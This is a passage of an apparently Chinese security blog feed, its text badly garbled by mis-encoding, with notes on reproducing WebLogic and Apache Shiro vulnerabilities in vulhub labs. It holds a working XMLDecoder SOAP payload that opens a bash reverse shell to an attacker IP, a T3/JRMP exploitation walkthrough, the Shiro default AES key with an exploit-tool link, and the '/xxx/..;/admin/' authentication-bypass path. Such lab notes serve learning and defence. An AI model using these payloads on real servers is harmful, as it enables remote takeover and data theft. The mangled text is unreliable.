ç„¶åæŠ“åŒ…ä¿å­˜</p><p>è¿™ä¸ªéªŒè¯ç å¯ä»¥ä¸€ç›´ç”¨</p><p>jså‰ç«¯éªŒè¯ åœ¨æµè§ˆå™¨ä¸Šè¿›è¡Œçš„éªŒè¯ å¨èƒï¼šæµè§ˆå™¨å¯ä»¥åœ¨å‰ç«¯ç›´æ¥å¿½ç•¥</p><p>æ¡†æ¶</p>]]></content>
      
      
      
        <tags>
            
            <tag> xiaodisec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>weblogicååºåˆ—åŒ–å¤ç°</title>
      <link href="/2025/03/07/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/03/07/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>Oracle Fusion Middlewareï¼ˆOracleèåˆä¸­é—´ä»¶ï¼‰æ˜¯ç¾å›½ç”²éª¨æ–‡ï¼ˆOracleï¼‰å…¬å¸çš„ä¸€å¥—é¢å‘ä¼ä¸šå’Œäº‘ç¯å¢ƒçš„ä¸šåŠ¡åˆ›æ–°å¹³å°ã€‚è¯¥å¹³å°æä¾›äº†ä¸­é—´ä»¶ã€è½¯ä»¶é›†åˆç­‰åŠŸèƒ½ã€‚Oracle WebLogic Serveræ˜¯å…¶ä¸­çš„ä¸€ä¸ªé€‚ç”¨äºäº‘ç¯å¢ƒå’Œä¼ ç»Ÿç¯å¢ƒçš„åº”ç”¨æœåŠ¡å™¨ç»„ä»¶ã€‚</p><p>Oracle Fusion Middlewareä¸­çš„Oracle WebLogic Serverç»„ä»¶çš„WLS Securityå­ç»„ä»¶å­˜åœ¨å®‰å…¨æ¼æ´ã€‚æ”»å‡»è€…å¯åˆ©ç”¨è¯¥æ¼æ´æ§åˆ¶ç»„ä»¶ï¼Œå½±å“æ•°æ®çš„å¯ç”¨æ€§ã€ä¿å¯†æ€§å’Œå®Œæ•´æ€§ã€‚</p><h4 id="0x01-å½±å“ç‰ˆæœ¬"><a href="#0x01-å½±å“ç‰ˆæœ¬" class="headerlink" title="0x01 å½±å“ç‰ˆæœ¬"></a>0x01 å½±å“ç‰ˆæœ¬</h4><p>Oracle WebLogic Server 10.3.6.0.0ç‰ˆæœ¬ï¼Œ12.1.3.0.0ç‰ˆæœ¬ï¼Œ12.2.1.1.0ç‰ˆæœ¬ï¼Œ12.2.1.2.0ç‰ˆæœ¬</p><p><strong>æ„é€ å¦‚ä¸‹Payloadï¼š</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.4.0&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/æ”»å‡»IP/1234 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨burpè¿›è¡ŒæŠ“åŒ… è¯·æ±‚å¤´ä¸­æ·»åŠ ä»¥ä¸‹å­—æ®µï¼š</strong></p><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="section">SOAPAction:</span></span><br><span class="line"><span class="section">Content-Type:text/xml</span></span><br></pre></td></tr></table></figure><p><strong>å†™å…¥å‡†å¤‡å¥½çš„payload POSTæ–¹å¼å‘é€å³å¯</strong></p><p>nc ç›‘å¬1234ç«¯å£åå¼¹shell</p><h1 id="Weblogicå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-2628ï¼‰"><a href="#Weblogicå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-2628ï¼‰" class="headerlink" title="Weblogicå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-2628ï¼‰"></a>Weblogicå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-2628ï¼‰</h1><h4 id="æ¼æ´å’‹äº§ç”Ÿçš„ï¼Ÿ"><a href="#æ¼æ´å’‹äº§ç”Ÿçš„ï¼Ÿ" class="headerlink" title=".æ¼æ´å’‹äº§ç”Ÿçš„ï¼Ÿ"></a><strong>.æ¼æ´å’‹äº§ç”Ÿçš„ï¼Ÿ</strong></h4><p>æ¼æ´çš„æ ¸å¿ƒæ˜¯<strong>WebLogicå¤„ç†T3åè®®æ•°æ®æ—¶çš„â€œæ— è„‘æ‹†åŒ…â€æœºåˆ¶</strong>ã€‚T3åè®®æ˜¯WebLogicé»˜è®¤å¼€å¯çš„é€šä¿¡åè®®ï¼Œç”¨äºæœåŠ¡å™¨å’ŒJavaç¨‹åºä¹‹é—´çš„æ•°æ®ä¼ è¾“ã€‚ä½†å®ƒåœ¨è§£ææ•°æ®æ—¶ï¼Œä¼šç›´æ¥å¯¹åºåˆ—åŒ–æ•°æ®ï¼ˆç±»ä¼¼æ‰“åŒ…çš„å¿«é€’ï¼‰è¿›è¡Œååºåˆ—åŒ–ï¼ˆæ‹†åŒ…ï¼‰ï¼Œè€Œ<strong>æ²¡æœ‰ä¸¥æ ¼æ£€æŸ¥åŒ…è£¹é‡Œæ˜¯å¦æœ‰å±é™©ç‰©å“</strong>ï¼ˆæ¶æ„ä»£ç ï¼‰</p><p><strong>T3åè®®é»˜è®¤å¼€æ”¾</strong>ï¼šWebLogicçš„7001ç«¯å£é»˜è®¤å¼€å¯T3æœåŠ¡ï¼Œç›¸å½“äºç»™é»‘å®¢ç•™äº†ä¸ªåé—¨</p><p><strong>ååºåˆ—åŒ–é»‘åå•ä¸å…¨</strong>ï¼šä¹‹å‰Oracleé€šè¿‡é»‘åå•æ‹¦æˆªå±é™©ç±»ï¼ˆæ¯”å¦‚<code>java.rmi.registry.Registry</code>ï¼‰ï¼Œä½†æ”»å‡»è€…æ¢äº†ä¸ªæ¥å£ï¼ˆå¦‚<code>java.rmi.activation.Activator</code>ï¼‰ï¼Œå°±ç»•è¿‡äº†æ£€æŸ¥</p><p><strong>ä¾èµ–å±é™©åº“</strong>ï¼šWebLogicä½¿ç”¨äº†å­˜åœ¨æ¼æ´çš„Apache Commons Collectionsåº“ï¼Œé»‘å®¢å¯é€šè¿‡è¿™ä¸ªåº“è§¦å‘ä»£ç æ‰§è¡Œ</p><h4 id="æ”»å‡»æ­¥éª¤æ‹†è§£"><a href="#æ”»å‡»æ­¥éª¤æ‹†è§£" class="headerlink" title="æ”»å‡»æ­¥éª¤æ‹†è§£"></a><strong>æ”»å‡»æ­¥éª¤æ‹†è§£</strong></h4><p><strong>åˆ†å››æ­¥èµ°</strong>ï¼š</p><ol><li><p><strong>ç¬¬ä¸€æ­¥ï¼šæ­â€œæŒ‡æŒ¥ä¸­å¿ƒâ€ï¼ˆJRMP Serverï¼‰</strong></p><ul><li>æ”»å‡»è€…åœ¨è‡ªå·±ç”µè„‘ä¸Šå¼€ä¸ª<strong>â€œæŒ‡æŒ¥ä¸­å¿ƒâ€</strong>ï¼ˆJRMPç›‘å¬æœåŠ¡ï¼‰ï¼Œç­‰ç€æœåŠ¡å™¨ä¸»åŠ¨è”ç³»ã€‚</li><li><em>ç›¸å½“äºé»‘å®¢å»ºäº†ä¸ªç§˜å¯†ç”µå°ï¼Œå‡†å¤‡å‘å·æ–½ä»¤ã€‚</em></li></ul></li><li><p><strong>ç¬¬äºŒæ­¥ï¼šä¼ªé€ â€œé€šè¡Œè¯â€ï¼ˆæ„é€ Payloadï¼‰</strong></p><ul><li><p>ç”¨å·¥å…·ç”Ÿæˆä¸€ä¸ª</p><p>â€œå‡é€šè¡Œè¯â€</p><p>ï¼ˆPayloadï¼‰ï¼Œé‡Œé¢å†™ç€ï¼š</p><ul><li><em>â€œæŒ‡æŒ¥ä¸­å¿ƒâ€åœ°å€ï¼ˆæ”»å‡»è€…IPå’Œç«¯å£ï¼‰ã€‚</em></li><li><em>â€œè§åˆ°æŒ‡æŒ¥ä¸­å¿ƒåï¼ŒæŒ‰å®ƒçš„æŒ‡ä»¤åŠäº‹ï¼â€</em></li></ul></li><li><p><em>è¿™ä¸ªé€šè¡Œè¯æœ¬è´¨æ˜¯ä¸€ä¸²ä¼ªè£…æˆæ­£å¸¸æ•°æ®çš„ä»£ç ï¼Œä½†æš—è—ç„æœºã€‚</em></p></li></ul></li><li><p><strong>ç¬¬ä¸‰æ­¥ï¼šå¿«é€’â€œç‚¸å¼¹â€ï¼ˆå‘é€Payloadï¼‰</strong></p><ul><li>é€šè¿‡WebLogicçš„<strong>T3å¿«é€’é€šé“</strong>ï¼ˆ7001ç«¯å£ï¼‰ï¼ŒæŠŠå‡é€šè¡Œè¯å¯„ç»™æœåŠ¡å™¨ã€‚</li><li><em>å› ä¸ºT3é€šé“é»˜è®¤å¼€æ”¾ä¸”å®‰æ£€ä¸ä¸¥ï¼ŒåŒ…è£¹é¡ºåˆ©é€è¾¾ã€‚</em></li></ul></li><li><p><strong>ç¬¬å››æ­¥ï¼šå¼•çˆ†â€œç‚¸å¼¹â€ï¼ˆè§¦å‘æ¼æ´ï¼‰</strong></p><ul><li>æœåŠ¡å™¨æ‹†å¼€åŒ…è£¹ï¼ˆååºåˆ—åŒ–Payloadï¼‰ï¼Œå‘ç°è¦è”ç³»â€œæŒ‡æŒ¥ä¸­å¿ƒâ€ã€‚</li><li>æœåŠ¡å™¨ä¸»åŠ¨è¿æ¥æ”»å‡»è€…çš„JRMPç›‘å¬æœåŠ¡ï¼Œ<strong>â€œæŒ‡æŒ¥ä¸­å¿ƒâ€ç«‹åˆ»ä¸‹å‘æœ€ç»ˆæŒ‡ä»¤</strong>ï¼ˆæ¯”å¦‚ï¼šâ€œæ‰§è¡Œå‘½ä»¤<code>rm -rf /*</code>åˆ åº“â€ï¼‰ã€‚</li><li><em>æ­¤æ—¶æœåŠ¡å™¨å®Œå…¨è¢«æ§åˆ¶ï¼Œæ”»å‡»è€…æƒ³å¹²å•¥å°±å¹²å•¥ã€‚</em></li></ul></li></ol><p><strong>T3åè®®</strong>ï¼šWebLogicçš„ä¸“å±å¿«é€’é€šé“ï¼Œé»˜è®¤å¼€æ”¾ä¸”æ•ˆç‡é«˜ï¼Œä½†å®‰æ£€ä¸ä¸¥</p><p><strong>RMIç»•è¿‡é»‘åå•</strong>ï¼šOracleç”¨é»‘åå•æ‹¦æˆªå·²çŸ¥å±é™©ç±»ï¼Œä½†æ”»å‡»è€…æ”¹ç”¨RMIåè®®çš„å…¶ä»–æ¥å£ï¼ˆå¦‚<code>Activator</code>ï¼‰ï¼Œæ¢æ±¤ä¸æ¢è¯ç»•è¿‡äº†æ£€æŸ¥</p><p><strong>ååºåˆ—åŒ–æ¼æ´</strong>ï¼šæœåŠ¡å™¨æ— è„‘æ‹†åŒ…è£¹ï¼ˆ<code>readObject</code>æ–¹æ³•ï¼‰ï¼ŒæŠŠæ¶æ„ä»£ç å½“æ­£å¸¸æŒ‡ä»¤æ‰§è¡Œ</p><p><strong>JRMPåè®®</strong>ï¼šæ”»å‡»è€…ç”¨JRMPç›‘å¬æœåŠ¡åšâ€œè¿œç¨‹æŒ‡æŒ¥â€ï¼Œè®©æœåŠ¡å™¨ä¸»åŠ¨è¿æ¥å¹¶æ¥æ”¶æ”»å‡»æŒ‡ä»¤</p><p>æ”»å‡»å°±æ˜¯åˆ©ç”¨CVE-2018-2628æ¼æ´å·¥å…·åŒ…(æ£€æµ‹å·¥å…·åœ¨å…¶ä¸­)</p><p>é¦–å…ˆæœ‰ä¸€ä¸ªç›‘æµ‹å·¥å…·éœ€è¦å°†txtæ–‡ä»¶æ”¹æˆç›®æ ‡åŠipæ£€æµ‹</p><p>æ£€æµ‹æˆåŠŸä¹‹å</p><p>åˆ©ç”¨ysoserialå»ç”Ÿæˆpayloadç„¶åå¯åŠ¨JRMPçš„ç›‘å¬</p><p>ç„¶ååˆ©ç”¨å·¥å…·ä¼ªé€ payload åå¼¹shellåˆ°æˆ‘çš„æ”»å‡»æœº</p><p>æŸ“çº¢é€šè¿‡T3é€šé“æŠŠpayloadä¼ é€’ç»™æœåŠ¡å™¨è¿›è¡Œååºåˆ—åŒ–è§£æè¿æ¥jRMPå»ºç«‹é€šè®¯</p><p>ç„¶åJRMPå‘é€åå¼¹shell çš„å‘½ä»¤ï¼Œæ‹¿ä¸‹æ”»å‡»æœº</p>]]></content>
      
      
      
        <tags>
            
            <tag> weblogic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiroååºåˆ—åŒ–æ¼æ´å¤ç°</title>
      <link href="/2025/03/07/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/03/07/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>vulhubé¶åœºå¤ç°</p><p>æ¼æ´åŸç†</p><p>Apache Shiroæ¡†æ¶æä¾›äº†è®°ä½å¯†ç çš„åŠŸèƒ½ï¼ˆRememberMeï¼‰ï¼Œç”¨æˆ·ç™»å½•æˆåŠŸåä¼šç”Ÿæˆç»è¿‡åŠ å¯†å¹¶ç¼–ç çš„cookieã€‚åœ¨æœåŠ¡ç«¯å¯¹rememberMeçš„cookieå€¼ï¼Œå…ˆbase64è§£ç ç„¶åAESè§£å¯†å†ååºåˆ—åŒ–ï¼Œå°±å¯¼è‡´äº†ååºåˆ—åŒ–RCEæ¼æ´ã€‚ é‚£ä¹ˆï¼ŒPayloadäº§ç”Ÿçš„è¿‡ç¨‹ï¼š å‘½ä»¤&#x3D;&gt;åºåˆ—åŒ–&#x3D;&gt;AESåŠ å¯†&#x3D;&gt;base64ç¼–ç &#x3D;&gt;RememberMe Cookieå€¼ åœ¨æ•´ä¸ªæ¼æ´åˆ©ç”¨è¿‡ç¨‹ä¸­ï¼Œæ¯”è¾ƒé‡è¦çš„æ˜¯AESåŠ å¯†çš„å¯†é’¥ï¼Œå¦‚æœæ²¡æœ‰ä¿®æ”¹é»˜è®¤çš„å¯†é’¥é‚£ä¹ˆå°±å¾ˆå®¹æ˜“å°±çŸ¥é“å¯†é’¥äº†,Payloadæ„é€ èµ·æ¥ä¹Ÿæ˜¯ååˆ†çš„ç®€å•ã€‚</p><p>è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„ <strong>Shiro RememberMe ååºåˆ—åŒ–æ¼æ´</strong>çš„è§¦å‘è·¯å¾„ã€‚ç”¨å¤§ç™½è¯è§£é‡Šå°±æ˜¯ï¼š</p><hr><h3 id="åœºæ™¯æ¯”å–»"><a href="#åœºæ™¯æ¯”å–»" class="headerlink" title="åœºæ™¯æ¯”å–»"></a><strong>åœºæ™¯æ¯”å–»</strong></h3><p>æƒ³è±¡ä½ è¿›äº†ä¸€å®¶é«˜çº§ä¼šæ‰€ï¼Œå‰å°ç»™ä½ ä¸€å¼ <strong>åŠ å¯†çš„ä¼šå‘˜å¡ï¼ˆRememberMe Cookieï¼‰</strong>ï¼Œä¸‹æ¬¡æ¥ä¸ç”¨è¾“å¯†ç ï¼Œç›´æ¥åˆ·å¡è¿›ã€‚ä½†è¿™å®¶ä¼šæ‰€çš„ä¼šå‘˜å¡åŠ å¯†æ–¹å¼æœ‰é—®é¢˜â€”â€”<strong>ç”¨çš„æ˜¯ä¸€æŠŠé€šç”¨é’¥åŒ™ï¼ˆé»˜è®¤å¯†é’¥ï¼‰</strong>ï¼Œå¯¼è‡´åäººèƒ½ä¼ªé€ ä»»æ„ä¼šå‘˜å¡ã€‚</p><hr><h3 id="æµç¨‹æ‹†è§£"><a href="#æµç¨‹æ‹†è§£" class="headerlink" title="æµç¨‹æ‹†è§£"></a><strong>æµç¨‹æ‹†è§£</strong></h3><ol><li><strong>ç™»å½•æˆåŠŸ</strong>ï¼š<br>ä½ è¾“å…¥è´¦å·å¯†ç æ­£ç¡®ï¼Œå‰å°ï¼ˆShiroï¼‰è¯´ï¼šâ€œè®°ä½è¿™ä¸ªç”¨æˆ·ï¼Œä¸‹æ¬¡ç›´æ¥åˆ·ä¼šå‘˜å¡è¿›ï¼â€<br>â†’ è§¦å‘ <code>onSuccessfulLogin</code> æ–¹æ³•ã€‚</li><li><strong>åˆ¶ä½œä¼šå‘˜å¡</strong>ï¼š<br>å‰å°æŠŠä½ çš„ä¿¡æ¯ï¼ˆç”¨æˆ·åã€æƒé™ï¼‰â€‹<strong>æ‰“åŒ…æˆå¿«é€’ï¼ˆåºåˆ—åŒ–ï¼‰â€‹</strong>ï¼Œç”¨<strong>ä¼šæ‰€ç»Ÿä¸€åŒ…è£…ç›’ï¼ˆåŠ å¯†ï¼‰â€‹</strong>å°å¥½ï¼Œå†è´´ä¸ªå¿«é€’å•ï¼ˆBase64ç¼–ç ï¼‰ã€‚<br>â†’ è°ƒç”¨ <code>rememberIdentity</code> â†’ <code>rememberSerializedIdentity</code>ã€‚</li><li><strong>å¿«é€’é…é€</strong>ï¼š<br>å‰å°æŠŠåŒ…è£…å¥½çš„å¿«é€’ï¼ˆåŠ å¯†åçš„æ•°æ®ï¼‰å¡è¿›ä½ çš„æµè§ˆå™¨ï¼Œå˜æˆä¸€å¼ <strong>ä¼šå‘˜å¡ï¼ˆCookieï¼‰â€‹</strong>ã€‚<br>â†’ è®¾ç½®Cookieå€¼ <code>rememberMe=åŠ å¯†åçš„Base64å­—ç¬¦ä¸²</code>ã€‚</li><li><strong>æ¼æ´åœ¨å“ª</strong>ï¼š<ul><li><strong>é€šç”¨é’¥åŒ™</strong>ï¼šæ‰€æœ‰ä¼šå‘˜å¡éƒ½ç”¨åŒä¸€æŠŠé’¥åŒ™åŠ å¯†ï¼ˆShiroé»˜è®¤ç¡¬ç¼–ç å¯†é’¥ï¼‰ã€‚</li><li><strong>åŒ…è£…ç›’å¯ç ´è§£</strong>ï¼šåºåˆ—åŒ–æ•°æ®ç”¨çš„æ˜¯å¯é¢„æµ‹çš„åŠ å¯†æ–¹å¼ï¼ˆAES-CBCï¼‰ã€‚<br>â†’ åäººæ‹¿åˆ°ä½ çš„ä¼šå‘˜å¡ï¼Œæ‹†å¼€åŒ…è£…ç›’ï¼Œæ¢ä¸Šè‡ªå·±çš„æ¯’åŒ…è£¹ï¼ˆæ¶æ„ä»£ç ï¼‰ï¼Œå†ç”¨åŸæ ·å°å¥½ï¼Œç³»ç»Ÿä¼šæ­£å¸¸è§£å¯†æ‰§è¡Œã€‚</li></ul></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.é¦–å…ˆæ­£å¸¸ç™»å½•ï¼Œç„¶åç”Ÿæˆå¸¦æœ‰remembermeçš„è¿”å›cookieå€¼ã€‚ 2.ç”Ÿæˆcookieï¼Œshiroä¼šæä¾›remembermeåŠŸèƒ½ï¼Œå¯ä»¥é€šè¿‡cookieè®°å½•ç™»å½•ç”¨æˆ·ï¼Œä»è€Œè®°å½•ç™»å½•ç”¨æˆ·çš„èº«ä»½è®¤è¯ä¿¡æ¯ï¼Œå³ä¸‹æ¬¡æ— éœ€ç™»å½•å³å¯è®¿é—®ã€‚å¤„ç†remembermeçš„cookieçš„ç±»ä¸ºorg.apache.shiro.web.mgt.CookieRememberMeManager 3.ä¹‹åè¿›å…¥serializeï¼Œå¯¹ç™»å½•è®¤è¯ä¿¡æ¯è¿›è¡Œåºåˆ—åŒ– 4.ç„¶ååŠ å¯†ï¼Œè°ƒç”¨aesç®—æ³•ã€‚ 5.åŠ å¯†ç»“æŸï¼Œç„¶ååœ¨åœ¨org/apache/shiro/web/mgt/CookieRememberMeManager.javaçš„rememberSerializedIdentityæ–¹æ³•ä¸­è¿›è¡Œbase64ç¼–ç ï¼Œå¹¶é€šè¿‡responseè¿”å› 6.è§£æcookie 7.å…ˆè§£å¯†åœ¨ååºåˆ—åŒ– 8.AESæ˜¯å¯¹ç§°åŠ å¯†ï¼ŒåŠ è§£å¯†å¯†é’¥éƒ½æ˜¯ç›¸åŒçš„ï¼Œå¹¶ä¸”shiroéƒ½æ˜¯å°†å¯†é’¥ç¡¬ç¼–ç  9.è°ƒç”¨cryptæ–¹æ³•åˆ©ç”¨å¯†æ–‡ï¼Œkeyï¼Œivè¿›è¡Œè§£å¯†,è§£å¯†å®Œæˆåè¿›å…¥ååºåˆ—åŒ–ï¼Œçœ‹ä¸Šé¢çš„public AbstractRememberMeManagerè¿™é‡Œç”¨çš„æ˜¯é»˜è®¤ååºåˆ—åŒ–ç±»,ç„¶åè§¦å‘ç”Ÿæˆååºåˆ—åŒ–</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆå¸¦æœ‰Remembermeçš„è¿”å›cookie-&gt;å¤„ç†remembermeçš„cookieçš„ç±»ä¸ºorg.apache.shiro.web.mgt.CookieRememberMeManager-&gt;åºåˆ—åŒ–ç™»å½•ä¿¡æ¯-&gt;äº¤ç»™aesè¿›è¡ŒåŠ å¯†-&gt;åŠ å¯†åorg&#x2F;apache&#x2F;shiro&#x2F;web&#x2F;mgt&#x2F;CookieRememberMeManager.javaçš„rememberSerializedIdentityè¿›è¡Œbase64ç¼–ç -&gt;è§£æcookie-&gt;å…ˆè§£å¯†åœ¨ååºåˆ—åŒ–</p><p>åˆ¤æ–­AESå¯†é’¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯†é’¥ä¸æ­£ç¡®æˆ–ç±»å‹è½¬æ¢å¼‚å¸¸æ—¶ï¼Œç›®æ ‡ResponseåŒ…å«Set-Cookieï¼šrememberMe=deleteMeå­—æ®µï¼Œ</span><br><span class="line"></span><br><span class="line">è€Œå½“å¯†é’¥æ­£ç¡®ä¸”æ²¡æœ‰ç±»å‹è½¬æ¢å¼‚å¸¸æ—¶ï¼Œè¿”å›åŒ…ä¸å­˜åœ¨Set-Cookieï¼šrememberMe=deleteMeå­—æ®µ</span><br></pre></td></tr></table></figure><p>å·¥å…·ï¼š<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated/releases">https://github.com/feihong-cs/ShiroExploit-Deprecated/releases</a></p><p>shrio-550ä½¿ç”¨çš„æ˜¯é»˜è®¤å¯†é’¥kPH+blxk5D2deZilxcaaaA&#x3D;&#x3D;</p><p>å·¥å…·éå¸¸ç»™åŠ›å¯ä»¥è·å¾—å¯†é’¥</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1741351728827.jpg"></p><p>è¿™å°±ä¸å»å¤ç°äº†</p><h1 id="Shiro-è®¤è¯ç»•è¿‡æ¼æ´-CVE-2020-1957"><a href="#Shiro-è®¤è¯ç»•è¿‡æ¼æ´-CVE-2020-1957" class="headerlink" title="[Shiro-è®¤è¯ç»•è¿‡æ¼æ´(CVE-2020-1957)]"></a>[Shiro-è®¤è¯ç»•è¿‡æ¼æ´(CVE-2020-1957)]</h1><p>æ ¸å¿ƒç‚¹å°±æ˜¯</p><ol><li><p><strong>åœºæ™¯è®¾å®š</strong>ï¼š</p><ul><li><strong>é—¨å«ï¼ˆShiroï¼‰</strong>ï¼šè´Ÿè´£æ£€æŸ¥æ¯ä¸ªå®¢äººèƒ½ä¸èƒ½è¿›VIPå®¤ï¼Œè§„åˆ™æ˜¯â€æ‰€æœ‰æƒ³è¿› <code>/vip</code> æˆ¿é—´çš„äººå¿…é¡»å‡ºç¤ºä¼šå‘˜å¡â€ã€‚</li><li><strong>ç®¡å®¶ï¼ˆSpringï¼‰</strong>ï¼šè´Ÿè´£å¸¦å®¢äººå»å®é™…æˆ¿é—´ï¼Œä½†å®ƒæœ‰ä¸ªæ€ªç™–â€”â€”<strong>çœ‹åˆ°åˆ†å· <code>;</code> å°±ä¼šè‡ªåŠ¨æˆªæ–­</strong>åé¢çš„å†…å®¹ã€‚</li></ul></li><li><p><strong>åäººå¦‚ä½•æ··è¿›VIPå®¤</strong>ï¼š<br>åäººä¸å»æ­£é—¨ <code>/vip</code>ï¼Œè€Œæ˜¯æ•…æ„èµ°æ­ªè·¯ï¼š</p><ul><li><strong>æ„é€ å‡è·¯å¾„</strong>ï¼š<code>/vip;/../ç§˜å¯†é€šé“</code></li><li><strong>é—¨å«è§†è§’</strong>ï¼šæ£€æŸ¥è·¯å¾„æ˜¯ <code>/vip</code>ï¼ˆå› ä¸ºShiroçœ‹åˆ°åˆ†å· <code>;</code> å°±åœä¸‹ï¼‰ï¼Œå‘ç°è§„åˆ™æ˜¯å…è®¸æ‰€æœ‰äººè®¿é—® <code>/vip</code>ï¼ˆæœªé…ç½®éœ€è¦ç™»å½•ï¼‰ï¼Œç›´æ¥æ”¾è¡Œã€‚</li><li><strong>ç®¡å®¶è§†è§’</strong>ï¼šå¤„ç†è·¯å¾„æ—¶ï¼Œçœ‹åˆ°åˆ†å· <code>;</code> å°±æˆªæ–­æˆ <code>/vip</code>ï¼Œå®é™…å´æŠŠå®¢äººå¸¦åˆ° <code>/ç§˜å¯†é€šé“</code>ï¼ˆVIPå®¤åé—¨ï¼‰ã€‚</li></ul><p>â†’ <strong>é—¨å«ä»¥ä¸ºä½ å»çš„æ˜¯å…¬å¼€åŒºåŸŸï¼Œç®¡å®¶å´æŠŠä½ å¸¦è¿›äº†VIPå®¤</strong>ï¼Œå…¨ç¨‹æ²¡æŸ¥ä¼šå‘˜å¡ï¼</p></li></ol><p>è¿™ä¸ªæ–‡ç« å†™çš„ä¹Ÿå¾ˆå¥½<a href="https://www.cnblogs.com/dhan/p/18423713">https://www.cnblogs.com/dhan/p/18423713</a></p><p>è¿™ä¸ªæ–‡ç« ä¸»æµpayloadæ˜¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/xxx/..;/admin/</span><br></pre></td></tr></table></figure><p>é¦–å…ˆshiroå¤„ç†çš„</p><p>å°†åˆ†å·åé¢çš„å†…å®¹ç›´æ¥å¤„ç†äº†å¾—åˆ°xxx&#x2F;..ï¼Œæ˜¾ç¤ºä¸æ˜¯è¦å»&#x2F;adminå¯ä»¥ç›´æ¥bypassæ‰äº†shiroè®¤è¯</p><p>springè®¤è¯</p><p>è·Ÿè¿›removeSemicolonContentInternal(requestUri)æ–¹æ³•ï¼Œä»–çš„ä½œç”¨å°±æ˜¯ï¼š<code>ç§»é™¤uriä¸­/ä¸/ä¹‹é—´çš„;åˆ†å·ä»¥åŠ;åˆ†å·åé¢çš„å†…å®¹</code></p><p>æ ¹æ®è¿™å¥è¯å¯ä»¥å¾—çŸ¥æœ€åçš„uriåº”è¯¥æ˜¯ï¼š</p><p><code>/xxx/../admin/ == /admin/</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>â€œfastjsonåˆæ¢â€</title>
      <link href="/2025/03/03/%E2%80%9Cfastjson%E5%88%9D%E6%8E%A2%E2%80%9D/"/>
      <url>/2025/03/03/%E2%80%9Cfastjson%E5%88%9D%E6%8E%A2%E2%80%9D/</url>
      
